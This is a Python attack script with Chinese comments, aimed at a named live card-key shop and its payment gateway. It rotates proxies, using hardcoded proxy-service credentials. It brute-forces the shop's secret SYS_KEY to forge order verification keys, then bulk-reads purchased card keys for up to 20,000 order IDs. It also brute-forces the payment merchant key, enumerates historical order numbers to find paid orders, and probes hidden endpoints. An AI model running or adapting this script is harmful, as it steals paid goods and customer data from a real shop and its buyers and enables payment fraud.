#!/usr/bin/env python3
"""
hmjf.lol 卡密深挖 v6 — 新路径
1. SYS_KEY 爆破 → skey = md5(id + SYS_KEY + id)  [彩虹同源]
2. ajax.php?act=query POST 正确参数 (type=1/qq=trade_no/input)
3. mod=order&id=N 内部ID探测
4. 易支付 pid=1003 商户key撞库 → api.ttwl66.cn
5. 历史订单回溯 yxts=258天
"""
import re, json, subprocess, time, os, hashlib, urllib.parse

BASE = "https://hmjf.lol/shop"
EPAY = "http://api.ttwl66.cn"
OUT = "/data/automation/results/hmjf.lol/kami_mine_20260716"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
REF = "https://hmjf.lol/shop/"
os.makedirs(OUT, exist_ok=True)

def lp():
    for l in open("/data/config/proxy.env"):
        if l.startswith("PROXY_URL="):
            return l.split("=", 1)[1].strip().strip('"')
    return ""

PX = lp()
N = 0
R = {"hits": [], "sys_key": None, "tests": {}}
LOG = open(f"{OUT}/v6.log", "a", buffering=1)

def log(m):
    print(m, flush=True)
    LOG.write(m + "\n")

def refresh():
    global PX
    subprocess.run(["bash", "/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True,
                   env={**os.environ, "QG_AUTHKEY": "02E76F93", "QG_AUTHPWD": "A0FFB679553D"})
    PX = lp()
    time.sleep(2)

def go(url, post=None, timeout=18):
    global N, PX
    N += 1
    if N % 60 == 0:
        refresh()
    c = ["curl", "-s", "-w", "\n__C:%{http_code}__", "--max-time", str(timeout),
         "-A", UA, "-H", f"Referer: {REF}", "-x", PX]
    if post is not None:
        c += ["-X", "POST", "-d", post,
              "-H", "Content-Type: application/x-www-form-urlencoded"]
    c.append(url)
    try:
        raw = subprocess.run(c, capture_output=True, text=True, timeout=timeout + 5).stdout or ""
        m = re.search(r"__C:(\d+)__", raw)
        body = raw[:m.start()] if m else raw
        return body, int(m.group(1)) if m else 0
    except Exception as e:
        return str(e), 0

def hit(tag, data):
    R["hits"].append({"via": tag, "data": data})
    log(f"*** HIT [{tag}] {str(data)[:300]}")

def skey_for(oid, sys_key):
    return hashlib.md5(f"{oid}{sys_key}{oid}".encode()).hexdigest()

def save():
    json.dump(R, open(f"{OUT}/v6_results.json", "w"), ensure_ascii=False, indent=2)

# ── A. ajax query POST (彩虹同源参数) ──
log("[A] ajax query POST variants")
known_tn = ["20260716025337303", "20260716030008400", "20260716031217345"]
for tn in known_tn:
    for post in [
        f"type=1&qq={tn}",
        f"qq={tn}",
        f"data={tn}",
        f"type=1&data={tn}",
        f"content={tn}",
        f"tradeno={tn}",
        f"trade_no={tn}",
    ]:
        body, code = go(f"{BASE}/ajax.php?act=query", post)
        key = f"query_{tn[:12]}_{post[:20]}"
        R["tests"][key] = {"code": code, "body": body[:300]}
        if body and '"code":0' in body and '"data"' in body:
            hit(f"ajax_query_{tn}", body[:500])
            try:
                j = json.loads(body)
                for row in j.get("data", []):
                    oid, sk = row.get("id"), row.get("skey")
                    if oid and sk:
                        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}")
                        try:
                            oj = json.loads(h)
                            if oj.get("kminfo"):
                                hit("kminfo_via_query", {"tn": tn, "id": oid, "kminfo": oj["kminfo"][:200]})
                        except Exception:
                            pass
            except Exception:
                pass
        time.sleep(0.25)
save()

# ── B. query by input (手机号/下单信息) ──
log("[B] query by contact input")
contacts = ["13800138000", "13912345678", "18888888888", "test", "test123", "kamitest"]
for c in contacts:
    for post in [f"qq={c}", f"type=0&qq={c}", f"input={c}"]:
        body, _ = go(f"{BASE}/ajax.php?act=query", post)
        if body and '"code":0' in body and '"data"' in body and len(body) > 80:
            hit(f"query_contact_{c}", body[:400])
        time.sleep(0.2)
save()

# ── C. SYS_KEY 爆破 (彩虹算法 md5(id+KEY+id)) ──
log("[C] SYS_KEY brute")
SYS_KEYS = [
    "", "123456", "123456789", "xuxin", "hmjf", "hmjf.lol", "shua", "faka",
    "admin", "secret", "key", "password", "虚心", "虚心U", "虚心U自动发卡",
    "kakayun", "caihong", "rainbow", "666666", "888888", "datou111",
    "TFQrPKpDjzLhQ288jv9tkFTj66Hqz1L76x", "1003", "ttwl66", "api.ttwl66.cn",
]
# 若已有泄露的 id+skey 对可验证
pairs = []  # append {"id": N, "skey": "..."} if found

for sk in SYS_KEYS:
    for oid in range(1, 201):
        calc = skey_for(oid, sk)
        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={calc}")
        if h and "验证失败" not in h:
            try:
                j = json.loads(h)
                if j.get("code") == 0:
                    hit("SYS_KEY_FOUND", {"sys_key": sk, "id": oid, "resp": j})
                    R["sys_key"] = sk
                    pairs.append({"id": oid, "skey": calc})
                    break
            except Exception:
                if "kminfo" in h.lower():
                    hit("SYS_KEY_RAW", {"sys_key": sk, "id": oid, "raw": h[:200]})
                    R["sys_key"] = sk
                    break
    if R["sys_key"]:
        break
    if SYS_KEYS.index(sk) % 5 == 0:
        log(f"  sys_key tried {sk!r} ...")
        save()
    time.sleep(0.1)

# 若撞出 SYS_KEY，批量扫 id 1-20000 读卡密
if R["sys_key"]:
    log(f"[C2] SYS_KEY={R['sys_key']!r} batch id scan")
    for oid in range(1, 20001):
        sk = skey_for(oid, R["sys_key"])
        h, _ = go(f"{BASE}/ajax.php?act=order", f"id={oid}&skey={sk}", timeout=12)
        try:
            j = json.loads(h)
            if j.get("kminfo") and j.get("status") in (1, 2, 0):
                hit("batch_kami", {"id": oid, "name": j.get("name"), "kminfo": j["kminfo"][:300]})
        except Exception:
            pass
        if oid % 500 == 0:
            log(f"  id {oid} hits={len(R['hits'])}")
            save()
        time.sleep(0.12)
save()

# ── D. mod=order 内部 id 探测 ──
log("[D] mod=order internal id")
for oid in [1, 2, 10, 100, 1000, 5000, 10000, 13330, 13377]:
    for param in [f"id={oid}", f"orderid={oid}"]:
        body, code = go(f"{BASE}/?mod=order&{param}")
        if code == 200 and len(body) > 1000:
            som = re.search(r"showOrder\s*\(\s*(\d+)\s*,\s*'([a-f0-9]{32})'", body)
            tn = re.search(r'id="orderid"\s+value="(\d+)"', body)
            R["tests"][f"mod_order_{param}"] = {
                "len": len(body), "trade_no": tn.group(1) if tn else None,
                "showOrder": som.groups() if som else None,
            }
            if som:
                hit(f"mod_order_{oid}", {"id": som.group(1), "skey": som.group(2)})
        time.sleep(0.2)
save()

# ── E. 易支付商户 key 撞库 (pid=1003) ──
log("[E] epay merchant key brute")
tn = "20260716030008400"
keys = ["123456", "admin", "xuxin", "hmjf", "666666", "888888", "ttwl66",
        "1003", "secret", "key", "password", "hmjf.lol", "api.ttwl66.cn"]
for key in keys:
    url = f"{EPAY}/api.php?act=order&pid=1003&key={urllib.parse.quote(key)}&out_trade_no={tn}"
    body, code = go(url, timeout=12)
    if body and "sign" not in body.lower() and ("trade_no" in body or '"code":1' in body or "status" in body):
        hit("epay_key", {"key": key, "body": body[:300]})
    R["tests"][f"epay_key_{key}"] = body[:150]
    time.sleep(0.3)
save()

# ── F. 历史订单回溯 (yxts≈258天 → 从202511起) ──
log("[F] historical paid scan (258d window)")
from datetime import datetime, timedelta
start = datetime(2025, 11, 1)
end = datetime(2026, 7, 16)
prefixes = []
d = start
while d <= end:
    for h in [10, 12, 14, 16, 18, 20, 22]:
        for m in [0, 30]:
            prefixes.append(d.strftime("%Y%m%d") + f"{h:02d}{m:02d}")
    d += timedelta(days=7)
prefixes = list(dict.fromkeys(prefixes))[:120]  # 采样120个时间窗

paid_found = []
for pi, prefix in enumerate(prefixes):
    for s in range(0, 1000, 50):  # 每窗抽20个
        tn = f"{prefix}{s:03d}"
        sh, _ = go(f"{BASE}/other/submit.php?type=alipay&orderid={tn}")
        if "_guard" in sh:
            time.sleep(8)
            refresh()
            continue
        if "window.location" not in sh or "该订单号不存在" in sh:
            continue
        gs, _ = go(f"{BASE}/other/getshop.php?trade_no={tn}")
        try:
            gj = json.loads(gs)
            if gj.get("kminfo"):
                hit("hist_getshop_kami", {"trade_no": tn, "data": gj})
            elif gj.get("code") != -1 or gj.get("msg") != "未付款":
                paid_found.append({"trade_no": tn, "getshop": gj})
                log(f"  PAID? {tn} {gj}")
        except Exception:
            pass
        # ajax query type=1
        qb, _ = go(f"{BASE}/ajax.php?act=query", f"type=1&qq={tn}")
        if qb and '"data"' in qb and '"code":0' in qb:
            hit("hist_ajax_query", {"trade_no": tn, "body": qb[:400]})
        time.sleep(0.2)
    if pi % 10 == 0:
        log(f"  hist {pi}/{len(prefixes)} paid={len(paid_found)}")
        save()
R["paid_found"] = paid_found
save()

# ── G. 其他入口 ──
log("[G] misc paths")
misc = [
    ("mini.php", f"{BASE}/mini.php"),
    ("doc.php", f"{BASE}/doc.php"),
    ("dlyz.php", f"{BASE}/dlyz.php"),
    ("api_order", f"{BASE}/api.php?act=order&pid=1003&out_trade_no=20260716030008400"),
    ("toollogs", f"{BASE}/toollogs.php"),
    ("getshuoshuo", f"{BASE}/ajax.php?act=getshuoshuo&uin=10000&page=1&hashsalt=test"),
    ("share_invite", f"{BASE}/ajax.php?act=share_invitegift_link"),
]
for name, url in misc:
    body, code = go(url if "ajax" not in name or "POST" not in name else url,
                     post="tid=72" if "share" in name else None)
    R["tests"][name] = {"code": code, "snippet": body[:200]}
    if "kminfo" in body.lower() or (name == "toollogs" and "卡密" in body):
        hit(name, body[:400])
    time.sleep(0.2)
save()

log(f"DONE hits={len(R['hits'])} sys_key={R['sys_key']}")
LOG.close()
json.dump(R, open(f"{OUT}/v6_results.json", "w"), ensure_ascii=False, indent=2)
